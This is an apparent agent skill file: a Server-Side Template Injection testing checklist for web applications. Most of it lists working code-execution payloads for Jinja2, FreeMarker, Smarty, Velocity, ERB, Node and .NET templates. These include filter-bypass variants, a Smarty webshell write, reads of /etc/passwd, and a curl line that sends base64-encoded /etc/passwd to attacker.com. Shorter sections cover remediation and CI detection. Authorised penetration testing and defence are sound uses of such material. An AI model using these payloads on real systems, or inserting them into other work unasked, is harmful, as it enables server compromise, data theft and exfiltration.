---

name: web-03-ssti
sequence: web-03
category: injection
domain: web
description: "Server-Side Template Injection testing checklist: template engine identification (Jinja2, Twig, Freemarker, Pebble, Velocity), polyglot detection payloads, engine-specific RCE payloads, blind SSTI, and filter bypass. Use when testing web apps for template injection vulnerabilities."
wordlist_ref: "wordlists/web/web-14-ssti/"
---

## Engine Identification

| Engine | Detection Signal | RCE Payload |
| **Blade** (Laravel 11)           | `Undefined variable` or `@dd($loop)` dumps          | `{!!\\Illuminate\\Support\\Facades\\Artisan::call('about')!!}`    |
| **Groovy / GSP**                 | Stack trace with `groovy.text.SimpleTemplateEngine` | `<% Class.forName('java.lang.Runtime').runtime.exec('id') %>`     |
| **Tera / Askama (Rust)**         | Files ending `.tera` / `.askama.rs`                 | No generic RCE yet; watch for logic injection                     |
| **EJS / Pug (Node)**             | `.ejs`, `.pug` templates                            | Often needs gadget via helpers/filters; prototype chains          |
| **Twig (PHP)**                   | Error mentions `Twig\\`                             | `{% for k,v in _self %}` info, RCE via unsafe extensions          |
| **Liquid** (Shopify/Ruby)        | `{{product.title}}`, errors mention `Liquid::`      | Limited by default; see Liquid-specific payloads below            |
| **Nunjucks** (Node/Mozilla)      | Mozilla's Jinja2 port, `.njk` templates             | Prototype chain to `Function` or `require`                        |
| **Handlebars** (Node)            | `{{this}}`, `{{@root}}` work                        | Limited RCE; requires unsafe helpers or prototype pollution       |
| **Thymeleaf 3.1+** (Java/Spring) | `th:text="${...}"`, Spring Boot stack traces        | `${T(java.lang.Runtime).getRuntime().exec('id')}` if SpEL enabled |

#### Variable Probing

Try injecting known variables for common frameworks: `{{config}}`, `{{settings}}`, `{{app.request.server.all|join(',')}}`, `{$smarty.version}`.

## Bypass Techniques

### Character Blacklist Bypass

- Use alternative syntax: `getattr(object, 'attribute')` instead of `object.attribute`. Use `{{request|attr('application')}}` instead of `{{request.application}}`.
- Use array/dictionary access: `request['application']` instead of `request.application`.
- Hex/Octal Encoding (if interpreted server-side): `request['\x5f\x5fglobals\x5f\x5f']` instead of `request['__globals__']`.
  ```python
  # Example: Bypass '.' and '_' using brackets and hex
  {{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}
  # Example: Using attr() and hex (Source: HackTricks)
  {%raw %}{% with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()%}{{a}}{% endwith %}{% endraw %}
  ```
- URL Parameter manipulation (Source: HackTricks):
  - Pass attribute name: `?c=__class__` -> `{{ request|attr(request.args.c) }}`
  - Construct attribute name: `?f=%s%sclass%s%s&a=_` -> `{{ request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a)) }}`
  - List join: `?l=a&a=_&a=_&a=class&a=_&a=_` -> `{{ request|attr(request.args.getlist(request.args.l)|join) }}`

> **Note:** The index for `subprocess.Popen` differs between CPython 3.11 and 3.12; enumerate `__subclasses__()` at runtime instead of hard‑coding.

### Keyword Filtering Bypass

- Concatenation: `'os'.__class__` -> `'o'+'s'`
- Using `request` object attributes or environment variables if keywords like `import` or `os` are blocked.
- Jinja2 Context Variables: Access `os` via `{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}` or similar paths ([Source: Podalirius](https://podalirius.net/fr/articles/python-vulnerabilities-code-execution-in-jinja-templates/)).

### NET Reflection

Use reflection to load assemblies or invoke methods indirectly.
On modern ASP.NET Core, Razor limits direct process start; look for misused `Html.Raw`, custom tag helpers, or debug compilation flags.

### String-less Exploitation

Modern WAFs often filter quotes and common keyword tokens. 2025 research showed how to build strings from arithmetic or list indices.

```jinja
{{ (().__class__.__base__.__subclasses__()[104].__init__.__globals__).os.popen('id').read() }}
```

For Node templating (EJS/Pug/Handlebars server-side), prefer prototype traversal to reach `Function` or `require` when helpers expose evaluation sinks:

```js
<%=(global.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')())%>
```

### Recent CVEs (2024‑2025)

| CVE            | Affected component                          | Severity | Fixed in              |
| -------------- | ------------------------------------------- | -------- | --------------------- |
| CVE‑2024‑22195 | Jinja2 sandbox / `xmlattr` filter bypass    | High     | 3.1.3                 |
| CVE‑2024‑46507 | Yeti threat‑intel platform SSTI → RCE       | Critical | 1.6.2                 |
| Various (2024) | Atlassian Confluence widgets, CrushFTP, HFS | Critical | See vendor advisories |

### Automated Scanning & CI Integration

- **nuclei** and **semgrep** include up‑to‑date SSTI rules; integrate them into pull‑request checks.
- GitHub code‑scanning query pack “SSTI” (released 2024‑10) covers Python, PHP, Go.
- Add a CI gate blocking merges on raw `render_template_string` or `.format()` inside templates.

## Vulnerabilities

Common vulnerable patterns include:

- Direct Rendering: `render_template_string("Hello " + user_input)`
- Unsafe Variable Usage: `{{ unsafe_variable }}` where `unsafe_variable` contains template code.
- Framework-Specific Functions: Using functions known to be dangerous if processing user input (consult framework documentation).

## Methodologies

### Tools

**Active Exploitation:**

- **tplmap**: `python tplmap.py -u 'http://www.target.com/page?name=John*'` ([https://github.com/epinna/tplmap](https://github.com/epinna/tplmap))
- **SSTImap**: `python3 sstimap.py -u "https://example.com/page?name=John" -s`
- **TInjA**: `tinja url -u "http://example.com/?name=Kirlia"`
- **crithit** – SSTI‑centric fuzzer supporting Go/Tera, Blade, and Mako (2024)

**Burp Suite Extensions:**

- **Template Injector** – maintained fork replacing TemplateTester
- **Server Side Template Injection** - Active scanner checks
- **Param Miner** - Discover hidden parameters that might accept template input

**Scanning & Detection:**

- **nuclei** (`templates/ssti-*`) – fast HTTP scanner with updated SSTI signatures (2024-2025)
- **semgrep** with SSTI rulesets – Static analysis for template injection vulnerabilities
- **GitHub CodeQL** "SSTI" query pack (2024-10) – Covers Python, PHP, Go

**Framework-Specific:**

- **Jinja2 Sandbox Escape Tools** - Testing Jinja2 sandboxed environments
- **Node Template Tester** - EJS/Pug/Handlebars/Nunjucks testing suite

### Manual Testing & Exploitation Payloads

- Generic/Polyglot:
  - `${{<%[%'"}}%\.`
  - `{{7*7}}` -> `49`
  - `{{7*'7'}}` -> `7777777`
  - `{{ '7'*7 }}` (Jinja2) -> `7777777`
  - `@(1+2)` (.NET Razor) -> `3`
- Jinja2 (Python / Flask):
  - Debug/Info: `{{config}}`, `{{self}}`, `{{settings.SECRET_KEY}}`, `{% debug %}` (Requires debug extension)
  - List Subclasses: `{{ [].__class__.__base__.__subclasses__() }}` , `{{ ''.__class__.__mro__[1].__subclasses__() }}` (Index 1 or 2 depending on Python version)
  - Recover `object` Class: `{{ ''.__class__.__mro__[1] }}` (or `[2]`), `{{ ''.__class__.__base__ }}`
  - Find File Class: Iterate through subclasses list or guess index, e.g., `[40]` on some systems.
  - Read File (via `__subclasses__`): `{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}` (Index varies)
  - RCE (via `__subclasses__`): `{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip() }}` (Find `subprocess.Popen` index, e.g., `396`)
  - RCE (Common - via `__globals__`): `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
  - RCE (via `request` object - `__globals__`): `{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}`
  - RCE (via `config` object - `__globals__`): `{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}`
  - RCE (Alternative via `__globals__` search): `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}` (Search for a class with `_module` attribute)
  - RCE (via `config` and `import_string`): `{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}`
  - RCE (via `request` and hex/brackets bypass): `{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}`
  - Write File (via `__subclasses__`): `{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evil', 'w').write('hello') }}` (Index varies)
  - Write Evil Config & RCE:
    ```python
    # Write config
    {{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
    # Load config
    {{ config.from_pyfile('/tmp/evilconfig.cfg') }}
    # Execute
    {{ config['RUNCMD']('id',shell=True) }}
    ```
  - Avoid HTML Encoding: `{{'<script>alert(1)</script>'|safe}}`
  - Loop: `{%raw %}{% for c in [1,2,3] %}{{ c,c,c }}{% endfor %}{% endraw %}`
- FreeMarker (Java):
  - RCE: `<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }`
  - RCE: `${"freemarker.template.utility.Execute"?new()("id")}`
  - File Read: `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}` (May require adjustments)
  - Info: `${class.getResource("").getPath()}`, `${T(java.lang.System).getenv()}`
- Smarty (PHP):
  - `{$smarty.version}`
  - `{php}echo `id`;{/php}` (If PHP tag enabled)
  - `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}` (Write webshell)
  - `{{7*7}}`, `{{7*'7'}}`
  - `{{dump(app)}}` (Symfony)
  - `"{{'/etc/passwd'|file_excerpt(1,30)}}"@` (Twig)
- Velocity (Java):
  - `#set($str=$class.inspect("java.lang.String").type)`
  - `#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))`
  - `$ex.waitFor()`
  - `#set($out=$ex.getInputStream()) ... #foreach ... $str.valueOf($chr.toChars($out.read())) ... #end` (Read command output)
- Ruby (ERB, Slim):
  - `<%= system("whoami") %>`
  - `<%= Dir.entries('/') %>`
  - `<%= File.open('/etc/passwd').read %>`
- Node.js (Various engines):
  - `{{this.constructor.constructor('return process.mainModule.require("child_process").execSync("id")')()}}`
  - Payloads often involve traversing prototypes (`this.__proto__`) to reach `constructor` and eventually `Function` or `require`. See PayloadAllTheThings / Hacker Recipes for detailed Node examples.
- ASP/.NET (Razor, etc.):
  - `@(1+2)` -> `3`
  - `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
  - `<%= CreateObject("Wscript.Shell").exec("cmd /c whoami").StdOut.ReadAll() %>` (Classic ASP)
- Perl (Template Toolkit):
  - `[% PERL %] ... perl code ... [% END %]`
  - `<%= perl code %>` or `<% perl code %>` (Depending on config)
- Go (`text/template`):
  - Potentially dangerous if methods allowing command execution are exposed to the template: `{{ .System "ls" }}`
  - `html/template` is generally safer against XSS but might still leak info if not used carefully.

### Comprehensive Payloads

- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [PayloadBox - SSTI](https://github.com/payloadbox/ssti-payloadsb/ssti-server-side-template-injection/index.html)

## Chaining and Escalation

SSTI often leads directly to RCE, but can also be used for:

- **RCE:** Primary goal, gain shell access.
- **File Exfiltration:** Read sensitive files (`/etc/passwd`, `web.config`, source code, credentials).
- **Information Disclosure:** Dump environment variables, application configuration (`{{config}}`, `{{settings}}`), object properties, internal network paths.
- **Internal Network Access:** Use RCE to pivot, scan internal networks, or access internal services.
- **Privilege Escalation:** Combine RCE with local exploits if the web server runs with elevated privileges.
- **Data Exfiltration:** Send internal data to an attacker-controlled server (e.g., via HTTP requests or DNS exfiltration from within the template code).
- **SSRF pivot:** Some engines permit URL‑fetch filters (`{{''|fetch('http://...')}}`); leverage SSTI to query cloud‑metadata endpoints.

## Remediation Recommendations

- Never Render User Input Directly: The most critical step. Treat user input as data, not code.
- Use Safe Templating Practices:
  - Pass user data into templates using dedicated template variables (e.g., `render_template('page.html', user_data=user_input)`).
  - Use logic-less templates if possible.
- Sanitize and Validate: If rendering user input is unavoidable (e.g., CMS), rigorously sanitize it. Remove or escape all template syntax characters (`{`, `}`, `$`, `%`, `<`, `>`, etc.). Use allow-lists for safe HTML if needed.
- Use Sandboxed Environments: Configure the template engine's sandbox if available and effective for the specific engine. Be aware that sandboxes can often be bypassed.
- Choose Safer Engines: Prefer engines designed for security, like Go's `html/template` over `text/template` for HTML output, as it provides context-aware auto-escaping.
- Principle of Least Privilege: Run the web application process with minimal privileges.
- Input Validation: Validate input against expected formats (e.g., email, number) before it reaches the template layer.
- Patch management: track and apply security updates for template engines (see Recent CVEs).
- Harden runtime: enable seccomp/AppArmor or gVisor so that even a successful RCE has minimal kernel attack surface.
- CI guardrails: block usage of dangerous APIs (e.g., `render_template_string`, `Template.compile`, `eval` filters) via linters/semgrep; add approve‑list of safe helpers
- For Node: disable `with` in EJS, avoid `compileDebug`, and run with `vm` sandbox only when fully locked down (no `require` or `Function` reachable)




## Hacker Mindset

**SSTI detection is trivial, exploitation is art.** If `{{7*7}}` returns `49`, you're in. The rest is navigating the object graph to reach `os.popen` or `Runtime.exec`.

**Every engine has a different graph.** Jinja2's `__class__.__mro__` chain is different from Twig's `_self.env` or FreeMarker's `?new()`. Know your engine before you exploit.

**Blind SSTI exists.** If you don't see output, try time-based: `{% if 1==1 %}sleep(5){% endif %}`



## Chaining & Escalation

### Direct Escalation
This vulnerability can often be escalated directly. Test for RCE, data access, or privilege escalation depending on context.

### Chain with Other Skills
| Partner Vulnerability | Chain Effect |
|----------------------|--------------|
| SSRF | Use SSRF to reach internal services through this vuln |
| XSS | Stolen sessions amplify account-level findings |
| IDOR/BOLA | Find more data to exploit via authorization gaps |

### Amplification
Race conditions, parallel requests, and HTTP/2 single-packet attacks can amplify impact by 10-50x.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed

### OOB Exfiltration
```
# Include exfiltrated data in the OOB request
curl http://attacker.com/$(cat /etc/passwd | base64)
```

## Wordlist Invocation

When testing this vulnerability, invoke the wordlist payloads manually:

**Wordlist**: `wordlists/web/web-14-ssti/`

**Files**:
- `wordlists/web/web-14-ssti/payloads/ssti/` — staged exploit payloads (low → med → high)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)
4. Always establish a baseline response before running time-based payloads

**Tools**: curl, httpx, Burp Suite, or any HTTP client

